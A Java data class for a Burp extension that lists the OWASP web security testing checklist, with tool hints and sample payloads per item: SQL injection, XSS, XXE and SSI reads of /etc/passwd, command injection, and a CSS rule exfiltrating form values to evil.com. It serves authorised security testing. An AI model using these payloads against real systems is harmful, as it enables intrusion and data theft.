package dev.wstgmapper;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * The full 96-item OWASP WSTG v4.2 checklist, plus one catch-all row
 * (GENERAL_FINDINGS_ID) that collects every Burp Scanner issue whose
 * name doesn't match a keyword in {@link IssueMapper} - so nothing a
 * Burp scan finds is ever silently discarded: it lands on a real WSTG
 * id, or it lands here.
 *
 * This is a straight, mechanical port of the checklist data from the
 * project's original Jython/Extender-API version - same ids,
 * categories, titles, tools and guidance text.
 */
public final class ChecklistData {

    public static final String GENERAL_FINDINGS_ID = "WSTG-GEN-00";
    public static final String ALL_CATEGORIES_LABEL = "All Categories";

    public static final List<ChecklistItem> ITEMS;
    public static final Map<String, ChecklistItem> BY_ID;
    public static final List<String> CATEGORY_ORDER;

    private static final List<ChecklistItem> BUILDER = new ArrayList<>();

    private static void add(String id, String category, String title, String tool, String guidance) {
        BUILDER.add(new ChecklistItem(id, category, title, tool, guidance));
    }

    static {
        add("WSTG-INFO-01", "1. Information Gathering (INFO)", "Search Engine Discovery", "Burp/Browser", "Target: Google/GitHub | Point: Search bar | Payload: site:target.com ext:sql OR ext:bak OR filetype:env | Method: Look for leaked data indexed in public domains.");
        add("WSTG-INFO-02", "1. Information Gathering (INFO)", "Fingerprint Web Server", "Burp Proxy", "Target: HTTP Response Headers | Point: Server / X-Powered-By / Via | Method: Inspect returned headers to identify exact service versions.");
        add("WSTG-INFO-03", "1. Information Gathering (INFO)", "Review Webserver Metafiles", "Burp/Browser", "Target: Root Directory | Point: /robots.txt , /sitemap.xml , /.well-known/ | Method: Open these paths to find hidden panels or non-indexed directories.");
        add("WSTG-INFO-04", "1. Information Gathering (INFO)", "Enumerate Applications", "Burp Intruder", "Target: Subdomains / Virtual Hosts | Point: Host Header | Method: Use Burp Intruder with a subdomain wordlist against the Host header.");
        add("WSTG-INFO-05", "1. Information Gathering (INFO)", "Review Webpage Comments/Metadata", "Burp Suite", "Target: HTML / JS Source Code | Point: Client-side comments | Method: Search Target Scope for keywords: password, api_key, secret, TODO, admin.");
        add("WSTG-INFO-06", "1. Information Gathering (INFO)", "Identify Application Entry Points", "Burp Proxy", "Target: Proxy History | Point: All GET/POST/JSON parameters | Method: Full review of proxy traffic to extract the application's attack surface.");
        add("WSTG-INFO-07", "1. Information Gathering (INFO)", "Map Execution Paths", "Burp Intruder", "Target: Application Root | Point: URL Path | Method: Send a wordlist to Intruder against the site path to find hidden folders.");
        add("WSTG-INFO-08", "1. Information Gathering (INFO)", "Fingerprint Web Application Framework", "Burp Repeater", "Target: Cookie & Response | Point: Cookie names (e.g. PHPSESSID, ASP.NET_SessionId) | Method: Match cookie names and header structure to backend technologies.");
        add("WSTG-INFO-09", "1. Information Gathering (INFO)", "Fingerprint Web Application", "Burp Repeater", "Target: Static Assets (JS/CSS) | Point: Old library files (e.g. vulnerable jQuery) | Method: Check hash/version of loaded JS files.");
        add("WSTG-INFO-10", "1. Information Gathering (INFO)", "Map Application Architecture", "Burp Proxy", "Target: Network Topology | Point: Inbound/outbound traffic | Method: Analyze firewall/load-balancer/proxy behavior from response headers.");
        add("WSTG-CONF-01", "2. Configuration and Deploy Management Testing (CONF)", "Network/Infrastructure Configuration", "Burp / Nmap", "Target: Network Ports | Point: Open ports like 21, 22, 3389, 8443 | Method: Check services attached to the main server and unwanted exposure.");
        add("WSTG-CONF-02", "2. Configuration and Deploy Management Testing (CONF)", "Application Platform Configuration", "Burp Repeater", "Target: Error Handling Parameters | Point: Send invalid chars like %00 or control chars | Method: Check server reaction for leaked stack traces/system errors.");
        add("WSTG-CONF-03", "2. Configuration and Deploy Management Testing (CONF)", "File Extensions Handling", "Burp Intruder", "Target: Dynamic Files | Point: e.g. index.php -> index.php.bak or index.old | Method: Test backup extensions with Intruder.");
        add("WSTG-CONF-04", "2. Configuration and Deploy Management Testing (CONF)", "Backup and Unreferenced Files", "Burp Intruder", "Target: Root / Web Root | Point: Request sensitive files like /.git/config, /.env, /backup.sql | Method: Test for leftover configuration files.");
        add("WSTG-CONF-05", "2. Configuration and Deploy Management Testing (CONF)", "Enumerate Infrastructure and Application Admin Interfaces", "Burp Intruder", "Target: Admin Paths | Point: Common paths like /admin/, /phpmyadmin/, /manager/html | Method: Search for unprotected admin panels.");
        add("WSTG-CONF-06", "2. Configuration and Deploy Management Testing (CONF)", "HTTP Methods", "Burp Repeater", "Target: API Endpoints | Point: Change method GET/POST to PUT, DELETE, OPTIONS | Method: Check whether server accepts unauthorized operations via other methods.");
        add("WSTG-CONF-07", "2. Configuration and Deploy Management Testing (CONF)", "HTTP Strict Transport Security", "Burp Repeater", "Target: HTTP Response | Point: Check Strict-Transport-Security, CSP, X-Frame-Options headers | Method: Ensure defensive browser headers are present.");
        add("WSTG-CONF-08", "2. Configuration and Deploy Management Testing (CONF)", "RIA Cross Domain Policy", "Burp Repeater", "Target: Root Path | Point: Request /crossdomain.xml and /clientaccesspolicy.xml | Method: Check Flash/Silverlight cross-domain access permissions.");
        add("WSTG-CONF-09", "2. Configuration and Deploy Management Testing (CONF)", "File Permission", "Burp Repeater", "Target: Upload/Public Folders | Point: Try to read/write files in sensitive directories without access.");
        add("WSTG-CONF-10", "2. Configuration and Deploy Management Testing (CONF)", "Subdomain Takeover", "Burp / DNS", "Target: DNS Records (CNAME) | Point: Subdomains pointing to expired cloud services (Heroku/AWS/GitHub).");
        add("WSTG-CONF-11", "2. Configuration and Deploy Management Testing (CONF)", "Cloud Storage", "Burp Repeater", "Target: Cloud URLs | Point: Request bucket.s3.amazonaws.com addresses | Method: Check public read/write access on cloud buckets.");
        add("WSTG-IDNT-01", "3. Identity Management Testing (IDNT)", "Role Definitions", "Burp Suite", "Target: Access Matrix | Point: Compare access of different account types (Guest, User, Admin).");
        add("WSTG-IDNT-02", "3. Identity Management Testing (IDNT)", "User Registration Process", "Burp Repeater", "Target: Registration Form | Point: Register with duplicate email, null chars, empty fields.");
        add("WSTG-IDNT-03", "3. Identity Management Testing (IDNT)", "Account Provisioning Process", "Burp Proxy", "Target: User Creation Flow | Point: Check whether created accounts require admin approval or auto-activate.");
        add("WSTG-IDNT-04", "3. Identity Management Testing (IDNT)", "Account Enumeration and Guessable User Account", "Burp Intruder", "Target: Login / Password Recovery | Point: Email or username field | Method: Compare server error text ('user not found' vs 'wrong password') to discover valid users.");
        add("WSTG-IDNT-05", "3. Identity Management Testing (IDNT)", "Weak or Unenforced Username Policy", "Burp Intruder", "Target: Registration / Login | Point: Register default usernames like admin, root, test.");
        add("WSTG-AUTHN-01", "4. Authentication Testing (AUTHN)", "Credentials Transported over an Encrypted Channel", "Burp Proxy", "Target: Login Request | Point: Inspect Request tab of login packet | Method: Ensure password is sent over HTTPS, not plain HTTP.");
        add("WSTG-AUTHN-02", "4. Authentication Testing (AUTHN)", "Default Credentials", "Burp Intruder", "Target: Login Endpoint | Point: username/password fields | Method: Send common default credential list (admin:admin, root:toor) via Intruder.");
        add("WSTG-AUTHN-03", "4. Authentication Testing (AUTHN)", "Weak Lock Out Mechanism", "Burp Intruder", "Target: Login API | Point: Send repeated wrong-password requests | Method: Check whether account locks after 5-10 failed attempts.");
        add("WSTG-AUTHN-04", "4. Authentication Testing (AUTHN)", "Bypassing Authentication Schema", "Burp Repeater", "Target: Login Parameters | Point: Login input field | Payload: admin' OR '1'='1'# or {\"username\": {\"$ne\": null}} | Method: Inject bypass payloads into login fields.");
        add("WSTG-AUTHN-05", "4. Authentication Testing (AUTHN)", "Vulnerable Remember Password", "Burp Repeater", "Target: Remember-Me Cookie | Point: Stored session cookies | Method: Check whether the Remember-Me token is random/unpredictable enough.");
        add("WSTG-AUTHN-06", "4. Authentication Testing (AUTHN)", "Browser Cache Weaknesses", "Browser", "Target: Logout Flow | Point: Browser Back button after logout | Method: Click browser back after Logout to check cached sensitive pages persist.");
        add("WSTG-AUTHN-07", "4. Authentication Testing (AUTHN)", "Weak Password Policy", "Burp Repeater", "Target: Change Password / Register | Point: New password field | Method: Test whether simple passwords like 123456 are accepted.");
        add("WSTG-AUTHN-08", "4. Authentication Testing (AUTHN)", "Weak Security Question Answer", "Burp Suite", "Target: Security Questions | Point: Answers (e.g. pet name, birth city) | Method: Check guessability or SQL injection in answers.");
        add("WSTG-AUTHN-09", "4. Authentication Testing (AUTHN)", "Weak Password Change or Reset Functionalities", "Burp Repeater", "Target: /account/password-change | Point: Password change request | Method: Check whether current password is required (CSRF on password change).");
        add("WSTG-AUTHN-10", "4. Authentication Testing (AUTHN)", "Weaker Authentication in Alternative Channel", "Burp Proxy", "Target: Mobile App APIs / Reset PIN | Point: SMS/mobile reset endpoints | Method: Check for weaker security or OTP brute-force potential.");
        add("WSTG-AUTHZ-01", "5. Authorization Testing (AUTHZ)", "Directory Traversal File Include", "Burp Repeater", "Target: File Download/View Parameters | Point: params like ?page= or ?file= | Payload: ../../../../../etc/passwd%00 | Method: Send traversal payloads in Repeater against system files.");
        add("WSTG-AUTHZ-02", "5. Authorization Testing (AUTHZ)", "Bypassing Authorization Schema (Vertical)", "Burp Autorize", "Target: Admin Endpoints | Point: Normal-user requests to admin paths | Method: Use the Autorize extension to compare admin packets against a normal-user session.");
        add("WSTG-AUTHZ-03", "5. Authorization Testing (AUTHZ)", "Bypassing Authorization Schema (Role Bypass)", "Burp Repeater", "Target: JSON Body / Headers | Point: Change role: user to role: admin, or custom headers | Method: Tamper with access-control parameters in the request body.");
        add("WSTG-AUTHZ-04", "5. Authorization Testing (AUTHZ)", "Insecure Direct Object References (IDOR)", "Burp Repeater / Intruder", "Target: User Specific Endpoints | Point: ID param like ?user_id=1055 or /profile/1055 | Method: Change ID to another user's account in Repeater and check for data exposure.");
        add("WSTG-SESS-01", "6. Session Management Testing (SESS)", "Bypassing Session Management Schema", "Burp Repeater", "Target: JWT / Session Tokens | Point: Auth token | Payload: change JWT alg to none or forge signature | Method: Test tampering with session tokens in Authorization header.");
        add("WSTG-SESS-02", "6. Session Management Testing (SESS)", "Cookies Attributes", "Burp Repeater", "Target: Set-Cookie Header | Point: Cookie security flags | Method: Ensure HttpOnly, Secure and SameSite flags exist on login response.");
        add("WSTG-SESS-03", "6. Session Management Testing (SESS)", "Session Fixation", "Burp Proxy", "Target: Login Request | Point: Compare session ID before/after login | Method: Check whether server regenerates session ID after successful login.");
        add("WSTG-SESS-04", "6. Session Management Testing (SESS)", "Session Variables Exposed in URL", "Burp Proxy", "Target: URL Parameters | Point: PHPSESSID or token in URLs | Method: Check for session leakage via browser history or server logs.");
        add("WSTG-SESS-05", "6. Session Management Testing (SESS)", "Cross Site Request Forgery", "Burp (CSRF PoC Generator)", "Target: State-changing Requests (e.g. change email/password) | Method: Right-click packet in Burp -> Engagement tools > Generate CSRF PoC.");
        add("WSTG-SESS-06", "6. Session Management Testing (SESS)", "Logout Functionality", "Burp Repeater", "Target: Logout Endpoint | Point: Replay user requests after clicking logout | Method: Check whether the session token is invalidated server-side after logout.");
        add("WSTG-SESS-07", "6. Session Management Testing (SESS)", "Session Timeout", "Burp / Browser", "Target: Inactive Sessions | Point: Session expiry after inactivity | Method: Check cookie persistence after browser close or long inactivity.");
        add("WSTG-SESS-08", "6. Session Management Testing (SESS)", "Session Puzzling", "Burp Repeater", "Target: Session Variables | Point: Inject bogus cookies/variables and check interference across app sections.");
        add("WSTG-SESS-09", "6. Session Management Testing (SESS)", "Session Hijacking", "Burp Suite", "Target: Cookie Security | Point: Missing HttpOnly allows script access to cookies (XSS to cookie theft).");
        add("WSTG-INPV-01", "7. Input Validation Testing (INPV)", "Reflected Cross Site Scripting", "Burp Repeater", "Target: Search / Input Parameters | Point: GET/POST params reflected in response | Payload: <svg/onload=alert(document.domain)> | Method: Inject payload in Repeater and check unencoded reflection.");
        add("WSTG-INPV-02", "7. Input Validation Testing (INPV)", "Stored Cross Site Scripting", "Burp Proxy", "Target: Profile / Comments / Form Inputs | Point: Fields stored in DB and shown to other users | Payload: <img src=x onerror=prompt(1)> | Method: Submit via proxy and open the page as another user.");
        add("WSTG-INPV-03", "7. Input Validation Testing (INPV)", "HTTP Verb Tampering", "Burp Repeater", "Target: API Endpoints | Point: Change request method POST<->GET to bypass WAF filters.");
        add("WSTG-INPV-04", "7. Input Validation Testing (INPV)", "HTTP Parameter Pollution", "Burp Repeater", "Target: URL Query String | Point: Duplicate params like ?id=1&id=2 | Method: Check server handling of same-name parameters.");
        add("WSTG-INPV-05", "7. Input Validation Testing (INPV)", "SQL Injection", "Burp Repeater / Intruder", "Target: ID / Search / Login Parameters | Point: Vulnerable numeric/text params | Payload: id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- | Method: Time-based or error-based testing in Repeater.");
        add("WSTG-INPV-06", "7. Input Validation Testing (INPV)", "LDAP Injection", "Burp Repeater", "Target: LDAP Authentication / Search Inputs | Point: Directory search fields | Payload: *) | Method: Inject LDAP structural characters to bypass directory auth.");
        add("WSTG-INPV-07", "7. Input Validation Testing (INPV)", "ORM / NoSQL Injection", "Burp Repeater", "Target: JSON APIs / MongoDB Queries | Point: JSON params | Payload: {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} | Method: Inject NoSQL operators into JSON request bodies.");
        add("WSTG-INPV-08", "7. Input Validation Testing (INPV)", "XML Injection (XXE)", "Burp Repeater", "Target: XML APIs / File Uploads | Point: XML request bodies | Payload: <!DOCTYPE test [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><foo>&xxe;</foo> | Method: Inject external entities into XML packets.");
        add("WSTG-INPV-09", "7. Input Validation Testing (INPV)", "SSI Injection", "Burp Repeater", "Target: Server Side Includes | Point: Username or comment fields | Payload: <!--#exec cmd='cat /etc/passwd' -->");
        add("WSTG-INPV-10", "7. Input Validation Testing (INPV)", "XPath Injection", "Burp Repeater", "Target: XML Search Queries | Point: XML search input params | Payload: ' or 1=1 or ''='");
        add("WSTG-INPV-11", "7. Input Validation Testing (INPV)", "IMAP/SMTP Injection", "Burp Repeater", "Target: Email Subscription / Contact Forms | Point: Email-related inputs | Payload: test\\r\\nBCC: hacker@evil.com");
        add("WSTG-INPV-12", "7. Input Validation Testing (INPV)", "Code Injection", "Burp Repeater", "Target: Dynamic Evaluation Parameters | Point: eval/assert functions in backend | Payload: phpinfo();");
        add("WSTG-INPV-13", "7. Input Validation Testing (INPV)", "OS Command Injection", "Burp Repeater", "Target: Ping / Network Tools / File Utilities | Point: Fields that execute OS commands | Payload: 127.0.0.1; cat /etc/passwd #");
        add("WSTG-INPV-14", "7. Input Validation Testing (INPV)", "Buffer Overflow", "Burp Intruder", "Target: String Inputs | Point: Send very long strings (e.g. 10000 'A' chars) to check crashes on legacy services.");
        add("WSTG-INPV-15", "7. Input Validation Testing (INPV)", "Testing for Incubated Vulnerabilities", "Burp Proxy", "Target: File Upload / Admin Panel | Point: Upload a file later executed elsewhere by an admin.");
        add("WSTG-INPV-16", "7. Input Validation Testing (INPV)", "HTTP Splitting/Smuggling (CRLF)", "Burp Repeater", "Target: Redirect Parameters | Point: Redirect params | Payload: %0D%0ASet-Cookie: injected=1");
        add("WSTG-INPV-17", "7. Input Validation Testing (INPV)", "Host Header Injection", "Burp Repeater", "Target: Password Reset Request | Point: Host header in reset packet | Payload: Host: evil-attacker.com | Method: Test password-reset link poisoning.");
        add("WSTG-INPV-18", "7. Input Validation Testing (INPV)", "Server Side Template Injection", "Burp Repeater", "Target: Template Engines (Jinja2, Twig, Thymeleaf) | Point: Username/profile fields | Payload: ${{7*7}} or {{7*7}} | Method: Check whether math expressions get evaluated in the response.");
        add("WSTG-INPV-19", "7. Input Validation Testing (INPV)", "Server-Side Request Forgery", "Burp Repeater / Collaborator", "Target: Image Fetcher / Webhook / URL Parameters | Point: External URL param | Payload: http://169.254.169.254/latest/meta-data/ | Method: Test server access to internal/cloud resources via Burp Collaborator.");
        add("WSTG-ERRH-01", "8. Error Handling (ERRH)", "Improper Error Handling", "Burp Repeater", "Target: Error Pages | Point: Send malformed data (e.g. array instead of string []) | Method: Check for database error (SQL syntax error) leakage in response.");
        add("WSTG-ERRH-02", "8. Error Handling (ERRH)", "Stack Traces", "Burp Repeater", "Target: Exception Handlers | Point: Trigger a system error | Method: Check for leaked code details/file paths in error pages (e.g. ASP.NET Yellow Screen).");
        add("WSTG-CRYP-01", "9. Weak Cryptography (CRYP)", "Weak Transport Layer Security", "Burp Proxy", "Target: Traffic Scope | Point: Check for card/credential data sent without TLS.");
        add("WSTG-CRYP-02", "9. Weak Cryptography (CRYP)", "Padding Oracle", "Burp / PadBuster", "Target: Ciphertext Parameters | Point: Cookies/params encrypted with CBC | Method: Analyze padding errors to decrypt data.");
        add("WSTG-CRYP-03", "9. Weak Cryptography (CRYP)", "Sensitive Information Sent via Unencrypted Channels", "Burp Proxy", "Target: Login Page | Point: Check for missing forced redirect from HTTP to HTTPS.");
        add("WSTG-CRYP-04", "9. Weak Cryptography (CRYP)", "Weak Encryption Algorithms", "Burp Repeater", "Target: Tokens / Passwords | Point: Check use of weak hashes like MD5 or SHA1 for tokens.");
        add("WSTG-BUSL-01", "10. Business Logic Testing (BUSL)", "Business Logic Data Validation", "Burp Repeater", "Target: Shopping Cart / Quantity | Point: Quantity field | Payload: quantity=-5 or quantity=0.0001 | Method: Send negative or fractional cart values.");
        add("WSTG-BUSL-02", "10. Business Logic Testing (BUSL)", "Ability to Forge Requests", "Burp Proxy", "Target: Hidden Price Fields | Point: Hidden input tags in payment form | Method: Change item price from 100 to 1 in the POST body.");
        add("WSTG-BUSL-03", "10. Business Logic Testing (BUSL)", "Integrity Checks", "Burp Repeater", "Target: Financial Checksums | Point: Invoice signature/checksum params | Method: Check whether the system prevents invoice tampering.");
        add("WSTG-BUSL-04", "10. Business Logic Testing (BUSL)", "Process Timing (Race Condition)", "Burp Turbo Intruder", "Target: Coupon / Withdrawal Endpoints | Point: Send dozens of concurrent requests with a one-time coupon | Method: Use Turbo Intruder for asynchronous concurrent requests.");
        add("WSTG-BUSL-05", "10. Business Logic Testing (BUSL)", "Number of Times a Function Can Be Used", "Burp Repeater", "Target: OTP / Single-use Tokens | Point: Repeat token-consumption request | Method: Check whether a used token is invalidated immediately or reusable.");
        add("WSTG-BUSL-06", "10. Business Logic Testing (BUSL)", "Circumvent Workflows", "Burp Repeater", "Target: Multi-step Checkout | Point: Jump directly from step 1 to final payment step, skipping confirmation.");
        add("WSTG-BUSL-07", "10. Business Logic Testing (BUSL)", "Defenses Against Application Misuse", "Burp Repeater", "Target: Captcha Verification | Point: Send a request without a captcha param or replay a used captcha token.");
        add("WSTG-BUSL-08", "10. Business Logic Testing (BUSL)", "Upload of Unexpected File Types", "Burp Repeater", "Target: File Upload Feature | Point: Avatar/document upload field | Payload: Upload a .php or .exe instead of an image | Method: Check server-side extension validation.");
        add("WSTG-BUSL-09", "10. Business Logic Testing (BUSL)", "Upload of Malicious Files", "Burp Repeater", "Target: File Upload / Extractor | Point: Upload a malicious compressed zip bomb to check processor crashes.");
        add("WSTG-CLNT-01", "11. Client Side Testing (CLNT)", "DOM-Based Cross Site Scripting", "Burp / Browser", "Target: URL Fragment (#) | Point: params read from location.hash in JS | Payload: https://target.com/page#<svg/onload=alert(1)>");
        add("WSTG-CLNT-02", "11. Client Side Testing (CLNT)", "JavaScript Execution", "Browser Console", "Target: Local Variables | Point: Global JS variables | Method: Tamper with variables like isAdmin=true in the browser console and observe effect.");
        add("WSTG-CLNT-03", "11. Client Side Testing (CLNT)", "HTML Injection", "Burp Repeater", "Target: Client Rendered Fields | Point: Fields rendered directly into the DOM | Payload: <h1>Hacked</h1>");
        add("WSTG-CLNT-04", "11. Client Side Testing (CLNT)", "Client Side URL Redirect (Open Redirect)", "Burp Repeater", "Target: Redirect Parameters (?next=, ?return_url=) | Payload: ?next=//evil.com or ?return_url=https://evil.com | Method: Check redirection to attacker site after login.");
        add("WSTG-CLNT-05", "11. Client Side Testing (CLNT)", "CSS Injection", "Burp Repeater", "Target: User Profile Styles | Point: Custom appearance fields | Payload: input[value^='a'] { background: url('https://evil.com/log?a'); } | Method: Exfiltrate sensitive form values via malicious styling.");
        add("WSTG-CLNT-06", "11. Client Side Testing (CLNT)", "Client Side Resource Manipulation", "Burp Proxy", "Target: External JS CDNs | Point: Change loaded third-party JS file URLs to an attacker server.");
        add("WSTG-CLNT-07", "11. Client Side Testing (CLNT)", "Cross Origin Resource Sharing", "Burp Repeater", "Target: API Requests | Point: Origin header | Payload: Origin: https://evil.com | Method: Check whether server reflects Access-Control-Allow-Origin: * or the attacker origin.");
        add("WSTG-CLNT-08", "11. Client Side Testing (CLNT)", "Cross Site Flashing", "Manual", "Target: Flash Files (.swf) | Method: (Deprecated) Check old Flash player vulnerabilities.");
        add("WSTG-CLNT-09", "11. Client Side Testing (CLNT)", "Clickjacking", "HTML Script PoC", "Target: Sensitive Pages (Settings/Delete) | Method: Build an HTML file with a transparent (opacity: 0) iframe to trick users into clicking hidden buttons.");
        add("WSTG-CLNT-10", "11. Client Side Testing (CLNT)", "WebSockets", "Burp WebSockets History", "Target: Real-time Messages | Point: WebSockets History tab in Burp | Method: Inspect and inject payloads into live socket traffic.");
        add("WSTG-CLNT-11", "11. Client Side Testing (CLNT)", "Web Messaging", "Browser Console", "Target: window.postMessage listeners | Point: postMessage events on client | Payload: window.postMessage('malicious data', '*'); | Method: Check for insecure cross-window message listeners.");
        add("WSTG-CLNT-12", "11. Client Side Testing (CLNT)", "Local Storage", "Browser Console", "Target: LocalStorage / SessionStorage | Point: Check for tokens/passwords stored via localStorage.getItem('token').");
        add("WSTG-CLNT-13", "11. Client Side Testing (CLNT)", "Client-Side Information Leakage", "Burp Repeater", "Target: JSONP Endpoints | Point: Check for leaked sensitive user data via unauthenticated JSONP responses.");

        add(GENERAL_FINDINGS_ID, "0. Additional Burp Scanner Findings (Unmapped)",
                "Other Burp Scanner Issues Not Matched to a Specific WSTG ID", "Burp Scanner",
                "Every issue Burp's Active Scan or Live Passive Scanning reports that could not be "
                        + "matched to a specific WSTG id by keyword (see IssueMapper) is collected here "
                        + "instead of being discarded. Review these individually and, if a pattern shows "
                        + "up often, add a keyword for it to IssueMapper.");

        ITEMS = Collections.unmodifiableList(new ArrayList<>(BUILDER));

        Map<String, ChecklistItem> byId = new LinkedHashMap<>();
        for (ChecklistItem item : ITEMS) {
            byId.put(item.id(), item);
        }
        BY_ID = Collections.unmodifiableMap(byId);

        List<String> categories = new ArrayList<>();
        for (ChecklistItem item : ITEMS) {
            if (!categories.contains(item.category())) {
                categories.add(item.category());
            }
        }
        CATEGORY_ORDER = Collections.unmodifiableList(categories);
    }

    private ChecklistData() {
    }
}
